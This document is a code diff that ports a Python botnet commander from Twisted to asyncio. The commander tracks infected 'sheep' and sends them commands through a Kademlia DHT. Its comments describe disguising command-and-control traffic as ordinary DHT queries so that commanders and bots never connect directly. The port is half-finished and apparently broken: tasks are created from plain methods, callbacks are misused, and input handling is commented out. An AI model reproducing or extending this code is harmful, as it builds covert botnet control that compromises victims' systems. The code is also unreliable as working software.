@@ -1,6 +1,7 @@
 from kademlia.network import Server
+
 #from twisted.protocols import basic
-#from twisted.internet import reactor, task, defer, stdio
+#from twisted.internet import stdio #reactor, task, defer,
 from collections import deque
 #from twisted.python import log
 import sys
@@ -13,20 +14,21 @@ import asyncio
 # A commander does not have to be connected to the network, bots will blindly keep querying until they have commands
 # If we bootstrapped into an existing kademlia network, all of this traffic just appears as normal queries.
 # All communication between commanders and bots occurs through DHT queries, they never communicate directly.
+loop=asyncio.get_event_loop()
+loop.set_debug(True)
 
-
-class SheepDriver(basic.LineReceiver): #Replace basic with asyncio version
+class SheepDriver(): #basic.LineReceiver <- Replace basic with asyncio version
     from os import linesep as delimiter
     import hashlib
-
+    
     # Key is hash of secret string
     def __init__(self, kserver, key):
         self.kserver = kserver
         self.key = key
         self.sheeps = {}
         self.count = 0
-        self.sheeploop = task.LoopingCall(self.checknewsheep) #Replace with Asyncio version
-        self.sheeploop.start(5)
+        self.sheeploop = loop.create_task(self.checknewsheep) #Replace with Asyncio version
+        #Possibly need to create a periodic task to check new sheep
 
     # check DHT for new nodes
     def checknewsheep(self):
@@ -39,7 +41,7 @@ class SheepDriver(basic.LineReceiver): #Replace basic with asyncio version
                     newval = valhash.hexdigest()
                     self.sheeps[val] = newval
                     self.kserver.set(self.sheeps[val], str(val))
-        self.kserver.get(self.key).addCallback(addsheep)
+        loop.call_soon_threadsafe(addsheep, self.kserver.get(self.key))
 
     # This function will send commands to the hash of bot's id
     def parsecommands(self, line):
@@ -125,22 +127,31 @@ myport = int(sys.argv[3])
 # log.startLogging(sys.stdout) #Replace with regular python loggin. 
 
 kserver = Server()
-kserver.listen(myport)
+loop.run_until_complete(kserver.listen(myport))
 # need a bootstrap address to join the network.
-kserver.bootstrap([(boot_ip, boot_port)])
+loop.run_until_complete(kserver.bootstrap([(boot_ip, boot_port)]))
 key = hashlib.sha1()
 
 # This is an arbitray key in DHT where a bot reports its existence.
 # We have hashed it in sha1 so that it appears
 # just like any other query on a kademlia network
-key.update('specialstring')
+key.update('specialstring'.encode('utf-8'))
 keyhash = key.hexdigest()
 
 # The commander takes in standard input passed into our Sheep Driver protocol
 # This could easily be changed from std input to remote input
 # we used stdin for proof of concept but the remote input would allow
 # the botmaster to spin up a commander from any location at any time.
-stdio.StandardIO(SheepDriver(kserver, keyhash)) #Replace with asyncio version
 
-reactor.run() #Change to AsyncIO loop
+#sys.stdin(SheepDriver(kserver,keyhash))
+#stdio.StandardIO(SheepDriver(kserver, keyhash)) #Replace with asyncio version
+
+try:
+    loop.run_forever()
+except KeyboardInterrupt:
+    pass
+finally:
+    kserver.stop()
+    loop.close()
+#reactor.run() #Change to AsyncIO loop
 
